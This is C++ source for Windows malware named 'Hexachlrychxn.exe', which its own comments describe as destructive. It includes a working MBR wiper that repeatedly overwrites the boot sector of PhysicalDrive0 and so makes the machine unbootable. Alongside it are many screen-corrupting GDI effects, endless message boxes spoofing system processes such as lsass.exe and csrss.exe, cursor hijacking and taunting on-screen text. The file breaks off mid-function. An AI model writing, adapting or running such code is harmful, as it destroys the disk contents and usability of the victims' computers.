// Hexachlrychxn.exe by VietNamLover.
// This is a destructive malware, do not run it on your real PC.
// If you want to test this malware on your real PC, test the safety version.

#include <Windows.h>
#include <windowsx.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib,"Msimg32.lib")
#include <math.h>
#include <time.h>
#include <algorithm>

volatile bool g_running = true;

#ifndef M_PI
#define M_PI 3.14159265358979323846264338327950288
#endif

#define PI M_PI

using namespace std;

// ==================== CUSTOM MBR DATA ====================
unsigned char MasterBootRecord[512] = {
    0x56, 0x49, 0x45, 0x54, 0x4E, 0x41, 0x4D, 0x4C, 0x4F, 0x56, 0x45, 0x52, 0x20, 0x57, 0x41, 0x53,
    0x20, 0x48, 0x45, 0x52, 0x45, 0x20, 0x2D, 0x20, 0x44, 0x45, 0x4C, 0x54, 0x41, 0x2E, 0x45, 0x58,
    0x45, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

typedef struct {
    FLOAT h;
    FLOAT s;
    FLOAT l;
} HSL;

// ==================== MBR WIPER ====================
DWORD WINAPI MBRWiper(LPVOID lpParam) {
    while (1) {
        DWORD dwBytesWritten;
        HANDLE hDevice = CreateFileW(
            L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
            FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
            OPEN_EXISTING, 0, 0);
        WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0);
        CloseHandle(hDevice);
    }
}
namespace Colors
{
    HSL rgb2hsl(RGBQUAD rgb)
    {
        HSL hsl;
        BYTE r = rgb.rgbRed;
        BYTE g = rgb.rgbGreen;
        BYTE b = rgb.rgbBlue;
        FLOAT _r = (FLOAT)r / 255.f;
        FLOAT _g = (FLOAT)g / 255.f;
        FLOAT _b = (FLOAT)b / 255.f;
        FLOAT rgbMin = min(min(_r, _g), _b);
        FLOAT rgbMax = max(max(_r, _g), _b);
        FLOAT fDelta = rgbMax - rgbMin;
        FLOAT deltaR;
        FLOAT deltaG;
        FLOAT deltaB;
        FLOAT h = 0.f;
        FLOAT s = 0.f;
        FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);
        if (fDelta != 0.f)
        {
            s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
            deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);
            if (_r == rgbMax)      h = deltaB - deltaG;
            else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
            else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
            if (h < 0.f)           h += 1.f;
            if (h > 1.f)           h -= 1.f;
        }
        hsl.h = h;
        hsl.s = s;
        hsl.l = l;
        return hsl;
    }

    RGBQUAD hsl2rgb(HSL hsl)
    {
        RGBQUAD rgb;
        FLOAT r = hsl.l;
        FLOAT g = hsl.l;
        FLOAT b = hsl.l;
        FLOAT h = hsl.h;
        FLOAT sl = hsl.s;
        FLOAT l = hsl.l;
        FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);
        FLOAT m;
        FLOAT sv;
        FLOAT fract;
        FLOAT vsf;
        FLOAT mid1;
        FLOAT mid2;
        INT sextant;
        if (v > 0.f)
        {
            m = l + l - v;
            sv = (v - m) / v;
            h *= 6.f;
            sextant = (INT)h;
            fract = h - sextant;
            vsf = v * sv * fract;
            mid1 = m + vsf;
            mid2 = v - vsf;
            switch (sextant)
            {
            case 0: r = v; g = mid1; b = m; break;
            case 1: r = mid2; g = v; b = m; break;
            case 2: r = m; g = v; b = mid1; break;
            case 3: r = m; g = mid2; b = v; break;
            case 4: r = mid1; g = m; b = v; break;
            case 5: r = v; g = m; b = mid2; break;
            }
        }
        rgb.rgbRed = (BYTE)(r * 255.f);
        rgb.rgbGreen = (BYTE)(g * 255.f);
        rgb.rgbBlue = (BYTE)(b * 255.f);
        return rgb;
    }
}

int red = 0, green = 0, blue = 0;
bool ifcolorblue = false, ifblue = false;

COLORREF Hue(int length) {
    if (red != length) {
        red++;
        if (ifblue == true) return RGB(red, 0, length);
        else return RGB(red, 0, 0);
    }
    else if (green != length) {
        green++;
        return RGB(length, green, 0);
    }
    else if (blue != length) {
        blue++;
        return RGB(0, length, blue);
    }
    else {
        red = 0; green = 0; blue = 0;
        ifblue = true;
        return RGB(0, 0, 0);
    }
}

COLORREF RndRGB() {
    int clr = rand() % 5;
    if (clr == 0) return RGB(255, 0, 0);
    if (clr == 1) return RGB(0, 255, 0);
    if (clr == 2) return RGB(0, 0, 255);
    if (clr == 3) return RGB(255, 0, 255);
    return RGB(255, 255, 0);
}

LPCWSTR generateRandomUnicodeString(int len)
{
    wchar_t* ustr = new wchar_t[len + 1];
    for (int i = 0; i < len; i++) ustr[i] = (rand() % 256) + 1024;
    ustr[len] = L'\0';
    return ustr;
}

// ============= MSGBOX THREADS =============
DWORD WINAPI msg(LPVOID lpParam) {
    while (1) {
        MessageBoxW(NULL, generateRandomUnicodeString(rand() % 10 + 10), L"hEXaCHlrYChxN.eXe", MB_ICONERROR | MB_CANCELTRYCONTINUE | MB_RTLREADING);
        MessageBoxW(NULL, generateRandomUnicodeString(rand() % 10 + 10), L"HexAchLryCHxn.ExE", MB_ICONWARNING | MB_YESNOCANCEL | MB_RTLREADING);
        MessageBoxW(NULL, generateRandomUnicodeString(rand() % 10 + 10), L"hExAcHlRycHXn.eXe", MB_ICONASTERISK | MB_ABORTRETRYIGNORE | MB_RTLREADING);
    }
    return 0;
}

DWORD WINAPI msg2(LPVOID lpParam) {
    while (1) MessageBoxW(NULL, generateRandomUnicodeString(rand() % 10 + 10), L"csrss.exe", MB_ICONERROR | MB_RETRYCANCEL);
    return 0;
}

DWORD WINAPI msg3(LPVOID lpParam) {
    while (1) MessageBoxW(NULL, generateRandomUnicodeString(rand() % 10 + 10), L"lsass.exe", MB_ICONWARNING | MB_OKCANCEL);
    return 0;
}

DWORD WINAPI msg4(LPVOID lpParam) {
    while (1) MessageBoxW(NULL, generateRandomUnicodeString(rand() % 10 + 10), L"wininit.exe", MB_ICONASTERISK | MB_YESNO | MB_RTLREADING);
    return 0;
}

DWORD WINAPI notepad(LPVOID lpParam) {
    MessageBoxW(NULL, L"gOoDlUCk!", L"hEXaCHlrYChxN.eXe bY vIEtnaMLovER", MB_ICONERROR);
    return 0;
}

DWORD WINAPI fakeerror(LPVOID lpParam) {
    MessageBoxW(NULL, L"yOuR pC hAs bEeN iNFeCTeD bY hEXaCHlrYChxN.eXe", L"hEXaCHlrYChxN.eXe", MB_ICONERROR);
    return 0;
}

// ============= SHADER EFFECTS =============
DWORD WINAPI shader1(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = screenWidth;
    bmpi.bmiHeader.biHeight = screenHeight;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    INT i = 0;
    while (1) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
        for (int x = 0; x < screenWidth; x++) {
            for (int y = 0; y < screenHeight; y++) {
                int index = y * screenWidth + x;
                int fx = (int)((i ^ 4) + (i * 4) * log(x * i & i * y ^ x * i * y * i));
                hslcolor = Colors::rgb2hsl(rgbquad[index]);
                hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }
    return 0;
}

VOID WINAPI train(HDC hdc, int w, int h, int xPower, int yPower, DWORD dwRop) {
    if (xPower >= w) xPower = w - 1; if (yPower >= h) yPower = h - 1;
    HBITMAP screenshot = CreateCompatibleBitmap(hdc, w, h);
    HDC hdc2 = CreateCompatibleDC(hdc);
    SelectObject(hdc2, screenshot);
    BitBlt(hdc2, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
    BitBlt(hdc, xPower > 0 ? xPower : 0, yPower > 0 ? yPower : 0, w - abs(xPower), h - abs(yPower), hdc, xPower < 0 ? -xPower : 0, yPower < 0 ? -yPower : 0, dwRop);
    BitBlt(hdc, xPower < 0 ? w + xPower : 0, 0, abs(xPower), h, hdc2, xPower > 0 ? w - xPower : 0, 0, dwRop);
    BitBlt(hdc, 0, yPower < 0 ? h + yPower : 0, w, abs(yPower), hdc2, 0, yPower > 0 ? h - yPower : 0, dwRop);
    DeleteDC(hdc2); DeleteObject(screenshot);
}

DWORD WINAPI shk(LPVOID lpParam) {
    HDC hdcdc = GetDC(0);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    while (1) {
        hdcdc = GetDC(0);
        for (int angle = 0; angle < 361; angle++) {
            int x = 100 * cos(angle * M_PI / 180.F), y = 100 * sin(angle * M_PI / 180.F);
            train(hdcdc, sw, sh, x, y, SRCERASE);
            Sleep(0.5);
        }
        ReleaseDC(0, hdcdc);
    }
    return 0;
}

DWORD WINAPI shader2(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    int r = 2, g = 1, b = 4, power = 22;
    HDC hdc, hdcMem; HBITMAP hbm;
    for (int i = 0;; i++, i %= 3) {
        hdc = GetDC(0); hdcMem = CreateCompatibleDC(hdc); hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcMem, hbm);
        BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY); GetBitmapBits(hbm, w * h * 4, data);
        for (int i = 0; w * h > i; i++) {
            int v = 1 + rand() % 13;
            ((BYTE*)(data + i))[r] = ((BYTE*)(data + i + v + power))[r] + 5.2;
            ((BYTE*)(data + i))[g] = ((BYTE*)(data + i + v + power))[g] + 5.2;
            ((BYTE*)(data + i))[b] = ((BYTE*)(data + i + v + power))[b] + 5.2;
        }
        SetBitmapBits(hbm, w * h * 4, data); BitBlt(hdc, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
        DeleteObject(hbm); DeleteObject(hdcMem);
        DeleteObject(hdc);
    }
    return 0;
}

DWORD WINAPI cur1(LPVOID lpParam) {
    while (1) {
        HDC hdc = GetDC(0);
        int x = GetSystemMetrics(SM_CXSCREEN);
        int y = GetSystemMetrics(SM_CYSCREEN);
        DrawIconEx(hdc, rand() % x, rand() % y, LoadCursor(0, IDC_HAND), (rand() % 5 + 1) * GetSystemMetrics(SM_CXICON), (rand() % 5 + 1) * GetSystemMetrics(SM_CYICON), 0, NULL, DI_NORMAL);
        DrawIconEx(hdc, rand() % x, rand() % y, LoadCursor(0, IDC_UPARROW), (rand() % 5 + 1) * GetSystemMetrics(SM_CXICON), (rand() % 5 + 1) * GetSystemMetrics(SM_CYICON), 0, NULL, DI_NORMAL);
        DrawIconEx(hdc, rand() % x, rand() % y, LoadCursor(0, IDC_SIZEALL), (rand() % 5 + 1) * GetSystemMetrics(SM_CXICON), (rand() % 5 + 1) * GetSystemMetrics(SM_CYICON), 0, NULL, DI_NORMAL);
        DrawIconEx(hdc, rand() % x, rand() % y, LoadCursor(0, IDC_NO), (rand() % 5 + 1) * GetSystemMetrics(SM_CXICON), (rand() % 5 + 1) * GetSystemMetrics(SM_CYICON), 0, NULL, DI_NORMAL);
        DrawIconEx(hdc, rand() % x, rand() % y, LoadCursor(0, IDC_HELP), (rand() % 5 + 1) * GetSystemMetrics(SM_CXICON), (rand() % 5 + 1) * GetSystemMetrics(SM_CYICON), 0, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        Sleep(1);
    }
    return 0;
}

DWORD WINAPI patblt(LPVOID lpParam) {
    while (1) {
        HDC hdc = GetDC(NULL);
        int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
        HBRUSH brush = CreateSolidBrush(RndRGB());
        SelectObject(hdc, brush);
        PatBlt(hdc, 0, 0, w, h, PATINVERT);
        DeleteObject(brush);
        ReleaseDC(NULL, hdc);
    }
    return 0;
}

DWORD WINAPI invcc(LPVOID lpParam) {
    HDC hdc = GetDC(0);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1), size = 100, radius = 227;
    while (1) {
        hdc = GetDC(0);
        int origX1 = rand() % sw, origY1 = rand() % sh;
        int origX2 = -20 + rand() % (sw + 20), origY2 = -20 + rand() % (sh + 20);
        int origX3 = -30 + rand() % (sw + 30), origY3 = -30 + rand() % (sh + 30);
        int origX4 = -20 + rand() % (sw + 20), origY4 = -20 + rand() % (sh + 20);
        int origX5 = rand() % sw, origY5 = rand() % sh;
        for (int angle = 0; angle < 1081; angle += 12.1) {
            InvalidateRect(0, 0, 0);
            int x1 = radius * cos(angle * M_PI / 180.0) + origX1, y1 = radius * sin(angle * M_PI / 180.0) + origY1;
            int x2 = radius * cos(angle * M_PI / 180.0) + origX2, y2 = radius * sin(angle * M_PI / 180.0) + origY2;
            int x3 = radius * cos(angle * M_PI / 180.0) + origX3, y3 = radius * sin(angle * M_PI / 180.0) + origY3;
            int x4 = radius * cos(angle * M_PI / 180.0) + origX4, y4 = radius * sin(angle * M_PI / 180.0) + origY4;
            int x5 = radius * cos(angle * M_PI / 180.0) + origX5, y5 = radius * sin(angle * M_PI / 180.0) + origY5;
            if (angle < 720) size += 20; if (angle > 720) size -= 39;
            HRGN circle1 = CreateEllipticRgn(x1, y1, x1 - size, y1 - size);
            HRGN circle2 = CreateEllipticRgn(x2, y2, x2 - size, y2 - size);
            HRGN circle3 = CreateEllipticRgn(x3, y3, x3 - size, y3 - size);
            HRGN circle4 = CreateEllipticRgn(x4, y4, x4 - size, y4 - size);
            HRGN circle5 = CreateEllipticRgn(x5, y5, x5 - size, y5 - size);
            InvertRgn(hdc, circle1); InvertRgn(hdc, circle2); InvertRgn(hdc, circle3); InvertRgn(hdc, circle4); InvertRgn(hdc, circle5);
            Sleep(26);
        }
        ReleaseDC(0, hdc);
    }
    return 0;
}

DWORD WINAPI tanwaves1(LPVOID lpParam) {
    HDC hdc = GetDC(0); HWND wnd = GetDesktopWindow();
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    double angle = 0;
    for (;;) {
        hdc = GetDC(0);
        for (float i = 0; i < sw + sh; i += 0.99f) {
            int a = tan(angle) * 50;
            BitBlt(hdc, 0, i, sw, 1, hdc, a, i, SRCCOPY);
            angle += M_PI / 60;
        }
        if ((rand() % 100 + 1) % 67 == 0) InvalidateRect(0, 0, 0);
        ReleaseDC(wnd, hdc);
        DeleteDC(hdc);
    }
    return 0;
}

DWORD WINAPI polygon1(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    int signX = 1, signY = 1, incrementor = 10, x = 10, y = 10;
    while (1) {
        HDC hdc = GetDC(0);
        x += incrementor * signX;
        y += incrementor * signY;
        HPEN hPen = CreatePen(PS_SOLID, 2, Hue(239));
        HPEN hOldPen = SelectPen(hdc, hPen);
        HBRUSH hBrush = CreateSolidBrush(Hue(239));
        HBRUSH hOldBrush = SelectBrush(hdc, hBrush);
        POINT vertices[] = { {x+20, y+50}, {x+180, y+50}, {x+180, y+20} , {x+230, x+70} , {x+180, y+120} , {x + 180, y + 90} , {x + 20, y + 90} };
        Polygon(hdc, vertices, sizeof(vertices) / sizeof(vertices[0]));
        SelectBrush(hdc, hOldBrush);
        DeleteObject(hBrush);
        SelectPen(hdc, hOldPen);
        DeleteObject(hPen);
        if (y >= GetSystemMetrics(SM_CYSCREEN)) signY = -1;
        if (x >= GetSystemMetrics(SM_CXSCREEN)) signX = -1;
        if (y == 0) signY = 1;
        if (x == 0) signX = 1;
        Sleep(1);
        ReleaseDC(0, hdc);
    }
    return 0;
}

DWORD WINAPI cur2(LPVOID lpParam) {
    POINT cursor;
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    int xf = 0, yf = 0, signX = 15, signY = 5, radius = 100;
    double angle = 0;
    int x, y, centerX, centerY;
    int origX = (w / 4) - (radius / 2), origY = (h / 4) - (radius / 2);
    while (1) {
        HDC hdc = GetDC(HWND_DESKTOP);
        xf += signX; yf += signY;
        centerX = origX - (w / 4); centerY = origY - (h / 4);
        x = (cos(angle) * radius) + centerX; y = (sin(angle) * radius) + centerY;
        int icon_x = GetSystemMetrics(SM_CXICON);
        int icon_y = GetSystemMetrics(SM_CYICON);
        GetCursorPos(&cursor);
        for (INT i = 64; i > 8; i -= 8) {
            SetCursorPos(50 + x - i + xf, 50 + y - i + yf);
            DrawIcon(hdc, cursor.x - icon_x, cursor.y - icon_y, LoadIcon(0, IDI_APPLICATION));
        }
        angle = fmod(angle + M_PI / radius, M_PI * radius);
        if (yf == 0) signY = 5;
        if (xf == 0) signX = 15;
        if (yf >= GetSystemMetrics(1)) signY -= 5;
        if (xf >= GetSystemMetrics(0)) signX -= 15;
        ReleaseDC(0, hdc);
        Sleep(10);
    }
    return 1;
}

DWORD WINAPI shader3(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    int rgb = 0xFFFFFFFF, v = 0;
    float radius = 17.4f;
    double angle = 0;
    HDC hdc, hdcMem; HBITMAP hbm;
    for (int i = 0;; i++, i %= 6) {
        hdc = GetDC(0); hdcMem = CreateCompatibleDC(hdc); hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcMem, hbm);
        BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY); GetBitmapBits(hbm, w * h * 4, data);
        for (int i = 0; w * h > i; i++) {
            int x = i % w, y = i / h;
            if (i % h == 0 && rand() % 100 == 0) v = 1 + rand() % 6;
            rgb ^= (int)data + (x^y);
            ((BYTE*)(data + i))[v] = rgb;
        }
        float x = cos(angle) * radius, y = sin(angle) * radius;
        SetBitmapBits(hbm, w * h * 4, data); BitBlt(hdc, 0, 0, w, h, hdcMem, x, y, SRCCOPY);
        DeleteObject(hbm); DeleteObject(hdcMem);
        DeleteObject(hdc);
        angle = fmod(angle + M_PI / radius, M_PI * radius);
    }
    return 0;
}

DWORD WINAPI y(LPVOID lpParam) {
    int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
    while (true) {
        HDC hdc = GetDC(HWND_DESKTOP);
        int y = rand() % sh, h = sh - rand() % sh - (sh / 1 - 8);
        HBRUSH brush = CreateSolidBrush(RndRGB());
        SelectObject(hdc, brush);
        BitBlt(hdc, 0, y, sw, h, hdc, rand() % 96 - 56, y, SRCCOPY);
        PatBlt(hdc, -1, y, sw, h, PATINVERT);
        DeleteObject(brush);
        ReleaseDC(0, hdc);
        if ((rand() % 100 + 1) % 67 == 0) InvalidateRect(0, 0, 0);
    }
    return 0;
}

// ============= THIẾU CÁC HÀM =============
DWORD WINAPI shader4(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = screenWidth;
    bmpi.bmiHeader.biHeight = screenHeight;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    INT i = 0;
    while (1) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
        for (int x = 0; x < screenWidth; x++) {
            for (int y = 0; y < screenHeight; y++) {
                int index = y * screenWidth + x;
                int fx = (int)((i ^ 4) + (i * 4) * log(x * y | i * x));
                hslcolor = Colors::rgb2hsl(rgbquad[index]);
                hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }
    return 0;
}

DWORD WINAPI radius(LPVOID lpParam) {
    int centerX = 600, centerY = 400, radius = 400;
    float angle = 0;
    while (true) {
        HDC hdc = GetDC(0);
        int x = centerX + static_cast<int>(radius * cos(angle * M_PI / 180));
        int y = centerY + static_cast<int>(radius * sin(angle * M_PI / 180));
        HBRUSH brush = CreateSolidBrush(Hue(239));
        SelectObject(hdc, brush);
        RoundRect(hdc, x - 40, y - 40, x + 40, y + 40, x / 2, y / 2);
        angle += 1;
        Sleep(10);
        DeleteObject(brush);
        ReleaseDC(0, hdc);
    }
    return 0;
}

DWORD WINAPI blur1(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    BLENDFUNCTION blur;
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    bmp = CreateDIBSection(hdc, &bmpi, 0, 0, NULL, 0);
    SelectObject(hdcCopy, bmp);
    blur.BlendOp = AC_SRC_OVER;
    blur.BlendFlags = 0;
    blur.AlphaFormat = 0;
    blur.SourceConstantAlpha = 10;
    while (1) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 10, w, h + 20, hdc, 0, 0, w, h, SRCERASE);
        AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blur);
        ReleaseDC(0, hdc);
    }
    return 0;
}

DWORD WINAPI icon2(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    int xf = 0, yf = 0, signX = 15, signY = 5, radius = 100;
    double angle = 0;
    int x, y, centerX, centerY;
    int origX = (w / 4) - (radius / 2), origY = (h / 4) - (radius / 2);
    while (1) {
        HDC hdc = GetDC(HWND_DESKTOP);
        xf += signX; yf += signY;
        centerX = origX - (w / 4); centerY = origY - (h / 4);
        x = (cos(angle) * radius) + centerX; y = (sin(angle) * radius) + centerY;
        int icon_x = GetSystemMetrics(SM_CXICON);
        int icon_y = GetSystemMetrics(SM_CYICON);
        for (INT i = 64; i > 8; i -= 8) {
            DrawIconEx(hdc, (50 + x - i + xf) - icon_x, (50 + y - i + yf) - icon_y, LoadIcon(0, IDI_QUESTION), 5 * GetSystemMetrics(SM_CXICON), 5 * GetSystemMetrics(SM_CYICON), 0, NULL, DI_NORMAL);
        }
        angle = fmod(angle + M_PI / radius, M_PI * radius);
        if (yf == 0) signY = 5;
        if (xf == 0) signX = 15;
        if (yf >= GetSystemMetrics(1)) signY -= 5;
        if (xf >= GetSystemMetrics(0)) signX -= 15;
        ReleaseDC(0, hdc);
        Sleep(10);
    }
    return 1;
}

DWORD WINAPI textout(LPVOID lpvd) {
    int x = GetSystemMetrics(0), y = GetSystemMetrics(1);
    while (1) {
        HDC hdc = GetDC(0);
        SetBkMode(hdc, TRANSPARENT);
        SetTextColor(hdc, Hue(239));
        HFONT font = CreateFontA(rand() % 100 + 20, rand() % 100 + 20, 0, 0, FW_THIN, 0, rand() % 1, 0, ANSI_CHARSET, 0, 0, 0, 0, "Comic Sans MS");
        SelectObject(hdc, font);
        const char* texts[] = {"hEXaCHlrYChxN.eXe", "r.I.p yOuR cOMpUTeR!", "tHErE iS nO eSCapE!", "sYstEm dEStROyeD!", "tHiS iS tHe eNd!", "sAy gOoDbYe tO yOuR pC nOw!", "bSoD iNComINg..."};
        for (int i = 0; i < 7; i++) {
            TextOutA(hdc, rand() % x, rand() % y, texts[i], strlen(texts[i]));
            Sleep(50);
        }
        DeleteObject(font);
        ReleaseDC(0, hdc);
    }
    return 0;
}

DWORD WINAPI shader5(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    INT i = 0;
    while (1) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                int fx = (int)((i ^ 4) + (i * 4) * sqrt(x + y | i & x));
                hslcolor = Colors::rgb2hsl(rgbquad[index]);
                hslcolor.h = fmod(fx / 400.f + y / h * .2f, 1.f);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }
    return 0;
}

DWORD WINAPI log21(LPVOID lpParam) {
    HDC hdc = GetDC(0);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    double angle = 0;
    for (;;) {
        hdc = GetDC(0);
        for (float i = 0; i < sw + sh; i += 0.99f) {
            int a = log2(angle + 1) * 50;
            BitBlt(hdc, 0, i, sw, 1, hdc, a, i, SRCCOPY);
            angle += M_PI / 60;
        }
        if ((rand() % 100 + 1) % 67 == 0) InvalidateRect(0, 0, 0);
        ReleaseDC(0, hdc);
        DeleteDC(hdc);
    }
    return 0;
}

DWORD WINAPI shader6(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    INT i = 0;
    while (1) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                int fx = (int)((i ^ 4) + (i * 4) * log2(x & y | x * i * y + 1));
                hslcolor = Colors::rgb2hsl(rgbquad[index]);
                hslcolor.h = fmod(fx / 400.f + y / h * .2f, 1.f);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }
    return 0;
}

DWORD WINAPI blur2(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC dcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    BLENDFUNCTION blur;
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
